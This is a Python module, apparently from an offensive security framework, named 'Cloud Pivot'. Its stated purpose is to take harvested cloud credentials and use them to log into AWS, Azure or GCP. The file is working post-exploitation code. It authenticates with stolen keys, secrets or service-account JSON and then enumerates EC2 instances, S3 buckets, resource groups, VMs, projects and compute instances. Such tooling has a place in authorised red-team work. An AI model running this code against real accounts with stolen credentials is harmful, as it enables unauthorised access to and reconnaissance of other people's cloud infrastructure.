from typing import Optional
from ...context import ExecutionContext
from ...registry import BaseExecutionModule, ExecutionResult, RiskLevel


TIMEOUT = 10


class CloudPivotModule(BaseExecutionModule):
    def __init__(self):
        super().__init__(
            module_id="cloud_pivot.exploit",
            title="Cloud Pivot - Connect and Enumerate Resources",
            risk_level=RiskLevel.DESTRUCTIVE,
            domain="cloud",
            description=(
                "Uses harvested cloud credentials to connect to AWS, Azure, or GCP "
                "and enumerate resources (EC2 instances, VMs, projects)."
            ),
            default_enabled=False,
        )

    def can_run(self, context: ExecutionContext) -> bool:
        return bool(getattr(context, "vault_addr", None))

    def execute(self, context: ExecutionContext, params: Optional[dict] = None) -> ExecutionResult:
        params = params or {}
        provider = params.get("provider", "aws").lower()
        region = params.get("region", "us-east-1")
        
        print(f"[*] [ACTIVE] Connecting to {provider.upper()} cloud...")

        # AWS
        if provider == "aws":
            return self._execute_aws(context, params)
        
        # Azure
        elif provider == "azure":
            return self._execute_azure(context, params)
        
        # GCP
        elif provider == "gcp":
            return self._execute_gcp(context, params)
        
        else:
            return ExecutionResult(
                status="error",
                message=f"Unsupported cloud provider: {provider}",
                evidence={"error": "Invalid provider"},
            )

    def _execute_aws(self, context, params):
        """AWS kaynaklarını listele"""
        try:
            import boto3
        except ImportError:
            return ExecutionResult(
                status="error",
                message="boto3 not installed. Run: pip install boto3",
                evidence={"error": "Missing dependency: boto3"},
            )

        access_key = params.get("access_key")
        secret_key = params.get("secret_key")
        session_token = params.get("security_token")
        region = params.get("region", "us-east-1")

        if not access_key or not secret_key:
            return ExecutionResult(
                status="failed",
                message="AWS credentials incomplete.",
                evidence={"error": "Missing access_key or secret_key"},
            )

        try:
            session = boto3.Session(
                aws_access_key_id=access_key,
                aws_secret_access_key=secret_key,
                aws_session_token=session_token,
                region_name=region,
            )

            results = {}
            
            # EC2 instance'ları listele
            try:
                ec2 = session.client('ec2')
                instances = ec2.describe_instances()
                instance_list = []
                for reservation in instances.get('Reservations', []):
                    for instance in reservation.get('Instances', []):
                        instance_list.append({
                            "id": instance.get('InstanceId'),
                            "state": instance.get('State', {}).get('Name'),
                            "type": instance.get('InstanceType'),
                            "public_ip": instance.get('PublicIpAddress'),
                            "private_ip": instance.get('PrivateIpAddress'),
                        })
                results["ec2_instances"] = instance_list
            except Exception as e:
                results["ec2_error"] = str(e)

            # S3 bucket'ları listele
            try:
                s3 = session.client('s3')
                buckets = s3.list_buckets()
                results["s3_buckets"] = [b['Name'] for b in buckets.get('Buckets', [])]
            except Exception as e:
                results["s3_error"] = str(e)

            context.add_finding(
                title="HIGH: AWS Resources Enumerated",
                description=f"Found {len(results.get('ec2_instances', []))} EC2 instances and {len(results.get('s3_buckets', []))} S3 buckets.",
                severity="HIGH",
                evidence=results,
            )

            return ExecutionResult(
                status="success",
                message=f"AWS pivot completed. Found {len(results.get('ec2_instances', []))} instances.",
                evidence=results,
            )

        except Exception as e:
            return ExecutionResult(
                status="error",
                message=f"AWS pivot failed: {str(e)}",
                evidence={"error": str(e)},
            )

    def _execute_azure(self, context, params):
        """Enumerate Azure resources using REST API (no SDK required).

        Authenticates via Client Credentials flow (tenant_id + client_id +
        client_secret) and lists resource groups + VMs via Azure Resource
        Manager REST API.
        """
        import json as _json
        import requests as _r

        tenant_id = params.get("tenant_id")
        client_id = params.get("client_id")
        client_secret = params.get("client_secret")
        subscription_id = params.get("subscription_id")

        if not all([tenant_id, client_id, client_secret, subscription_id]):
            return ExecutionResult(
                status="skipped",
                message="Azure requires tenant_id, client_id, client_secret, subscription_id params.",
                evidence={"missing": [k for k in ("tenant_id","client_id","client_secret","subscription_id") if not params.get(k)]},
            )

        try:
            # Step 1: OAuth2 token
            token_resp = _r.post(
                f"https://login.microsoftonline.com/{tenant_id}/oauth2/token",
                data={
                    "grant_type": "client_credentials",
                    "client_id": client_id,
                    "client_secret": client_secret,
                    "resource": "https://management.azure.com/",
                },
                timeout=TIMEOUT,
            )
            if token_resp.status_code != 200:
                return ExecutionResult(
                    status="failed",
                    message=f"Azure OAuth2 failed: {token_resp.status_code}",
                    evidence={"response": token_resp.text[:300]},
                )
            access_token = token_resp.json().get("access_token")
            auth_header = {"Authorization": f"Bearer {access_token}"}

            # Step 2: List resource groups
            rg_resp = _r.get(
                f"https://management.azure.com/subscriptions/{subscription_id}/resourcegroups?api-version=2021-04-01",
                headers=auth_header, timeout=TIMEOUT,
            )
            resource_groups = []
            if rg_resp.status_code == 200:
                resource_groups = [rg["name"] for rg in rg_resp.json().get("value", [])]

            # Step 3: List VMs across all resource groups
            vms = []
            for rg_name in resource_groups[:5]:  # limit to first 5 groups
                vm_resp = _r.get(
                    f"https://management.azure.com/subscriptions/{subscription_id}/"
                    f"resourceGroups/{rg_name}/providers/Microsoft.Compute/virtualMachines"
                    f"?api-version=2021-07-01",
                    headers=auth_header, timeout=TIMEOUT,
                )
                if vm_resp.status_code == 200:
                    for vm in vm_resp.json().get("value", []):
                        vms.append({
                            "name": vm.get("name"),
                            "location": vm.get("location"),
                            "vmSize": vm.get("properties", {}).get("hardwareProfile", {}).get("vmSize"),
                            "resourceGroup": rg_name,
                        })

            context.add_finding(
                title="Azure resources enumerated",
                description=f"Listed {len(resource_groups)} resource groups and {len(vms)} VMs.",
                severity="HIGH",
                evidence={"resource_groups": resource_groups, "vms": vms},
            )
            return ExecutionResult(
                status="success",
                message=f"Azure: {len(resource_groups)} resource groups, {len(vms)} VMs found.",
                evidence={"resource_groups": resource_groups[:10], "vms": vms[:10]},
            )
        except Exception as e:
            return ExecutionResult(
                status="error",
                message=f"Azure pivot failed: {e}",
                evidence={"error": str(e)},
            )

    def _execute_gcp(self, context, params):
        """Enumerate GCP resources using REST API (no SDK required).

        Authenticates via service account JSON key (either file path or
        inline JSON) and lists projects + compute instances using GCP
        Resource Manager and Compute Engine REST APIs.
        """
        import json as _json
        import requests as _r

        sa_key_path = params.get("service_account_key")
        sa_key_json = params.get("service_account_key_json")

        if not sa_key_path and not sa_key_json:
            return ExecutionResult(
                status="skipped",
                message="GCP requires service_account_key (file path) or service_account_key_json (inline JSON).",
                evidence={"missing": ["service_account_key or service_account_key_json"]},
            )

        try:
            # Load service account credentials
            if sa_key_json:
                sa_info = _json.loads(sa_key_json) if isinstance(sa_key_json, str) else sa_key_json
            else:
                with open(sa_key_path, "r", encoding="utf-8") as f:
                    sa_info = _json.load(f)

            # Step 1: Get OAuth2 access token via JWT assertion
            import time as _time
            import jwt as _jwt  # PyJWT

            now = int(_time.time())
            assertion = {
                "iss": sa_info["client_email"],
                "scope": "https://www.googleapis.com/auth/cloud-platform",
                "aud": "https://oauth2.googleapis.com/token",
                "iat": now,
                "exp": now + 3600,
            }
            signed = _jwt.encode(assertion, sa_info["private_key"], algorithm="RS256")
            token_resp = _r.post(
                "https://oauth2.googleapis.com/token",
                data={
                    "grant_type": "urn:ietf:params:oauth:grant-type:jwt-bearer",
                    "assertion": signed,
                },
                timeout=TIMEOUT,
            )
            if token_resp.status_code != 200:
                return ExecutionResult(
                    status="failed",
                    message=f"GCP OAuth2 failed: {token_resp.status_code}",
                    evidence={"response": token_resp.text[:300]},
                )
            access_token = token_resp.json().get("access_token")
            auth_header = {"Authorization": f"Bearer {access_token}"}

            # Step 2: List projects
            projects_resp = _r.get(
                "https://cloudresourcemanager.googleapis.com/v1/projects",
                headers=auth_header, timeout=TIMEOUT,
            )
            projects = []
            if projects_resp.status_code == 200:
                projects = [p["projectId"] for p in projects_resp.json().get("projects", [])]

            # Step 3: List compute instances in first 3 projects
            instances = []
            for project_id in projects[:3]:
                zones_resp = _r.get(
                    f"https://compute.googleapis.com/compute/v1/projects/{project_id}/zones",
                    headers=auth_header, timeout=TIMEOUT,
                )
                if zones_resp.status_code != 200:
                    continue
                for zone in zones_resp.json().get("items", [])[:3]:
                    zone_name = zone["name"]
                    inst_resp = _r.get(
                        f"https://compute.googleapis.com/compute/v1/projects/{project_id}/zones/{zone_name}/instances",
                        headers=auth_header, timeout=TIMEOUT,
                    )
                    if inst_resp.status_code == 200:
                        for inst in inst_resp.json().get("items", []):
                            instances.append({
                                "name": inst["name"],
                                "zone": zone_name,
                                "machineType": inst.get("machineType", "").split("/")[-1],
                                "status": inst.get("status"),
                                "project": project_id,
                            })

            context.add_finding(
                title="GCP resources enumerated",
                description=f"Listed {len(projects)} projects and {len(instances)} compute instances.",
                severity="HIGH",
                evidence={"projects": projects, "instances": instances},
            )
            return ExecutionResult(
                status="success",
                message=f"GCP: {len(projects)} projects, {len(instances)} instances found.",
                evidence={"projects": projects, "instances": instances[:10]},
            )
        except ImportError:
            return ExecutionResult(
                status="error",
                message="GCP pivot requires PyJWT: pip install pyjwt",
                evidence={"error": "Missing dependency: pyjwt"},
            )
        except Exception as e:
            return ExecutionResult(
                status="error",
                message=f"GCP pivot failed: {e}",
                evidence={"error": str(e)},
            )